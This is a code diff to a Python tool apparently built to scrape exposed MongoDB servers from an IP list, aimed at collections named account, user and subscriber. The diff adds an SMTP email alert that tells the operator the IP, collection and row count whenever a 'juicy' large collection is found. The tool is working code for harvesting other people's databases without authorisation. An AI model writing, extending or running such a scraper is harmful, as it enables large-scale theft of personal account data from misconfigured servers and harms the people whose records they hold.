@@ -6,11 +6,14 @@ from colorlog import ColoredFormatter
 from pymongo import MongoClient
 import io
 import os
+import smtplib
+from email.mime.text import MIMEText
 
 
 class MongodbScraper:
     def __init__(self):
         # Init class variables
+        self.settings = {}
         self.ips = []
         self.processed = []
         self.table_names = ['account', 'user', 'subscriber']
@@ -70,6 +73,57 @@ class MongodbScraper:
             self.logger.info("Settings file found")
         except (IOError, ValueError):
             self.logger.info("Settings file not found")
+
+    def _notify(self, ip, collection, count):
+        try:
+            threshold = self.settings['email']['threshold']
+        except KeyError:
+            # No key set
+            return
+
+        # Result is not interesting enough
+        if count < threshold:
+            return
+
+        # Do I have all the required strings?
+        try:
+            email_from = self.settings['email']['from']
+            email_to = self.settings['email']['to']
+            host = self.settings['email']['smtp']['host']
+            port = self.settings['email']['smtp']['port']
+            user = self.settings['email']['smtp']['user']
+            password = self.settings['email']['smtp']['password']
+        except KeyError:
+            return
+
+        # Ok, but are they really set?
+        if not all([email_from, email_to, host, port, user, password]):
+            return
+
+        # Ok, we're good to go
+        body = """
+Hi Dude!
+I have just found a juicy collection!
+
+IP: {0}
+Collection: {1}
+Rows: {2}
+"""
+        body = body.format(ip, collection, count)
+        mailer = smtplib.SMTP(host, str(port), timeout=10)
+        mailer.starttls()
+        mailer.login(user=user, password=password)
+        message = MIMEText(body)
+
+        message['Subject'] = 'Juicy collection at ' + ip
+        message['From'] = email_from
+        message['To'] = email_to
+
+        try:
+            mailer.sendmail(email_from, [email_to], message.as_string())
+            mailer.quit()
+        except smtplib.SMTPException:
+            return
 
     def scrape(self):
         for ip in self.ips:
@@ -161,6 +215,8 @@ class MongodbScraper:
 
                     if total > 750:
                         self.logger.info("***FOUND COLLECTION WITH  " + str(total) + "  RECORDS. JUICY!!")
+
+                    self._notify(ip, collection, total)
 
                     lines = []
 
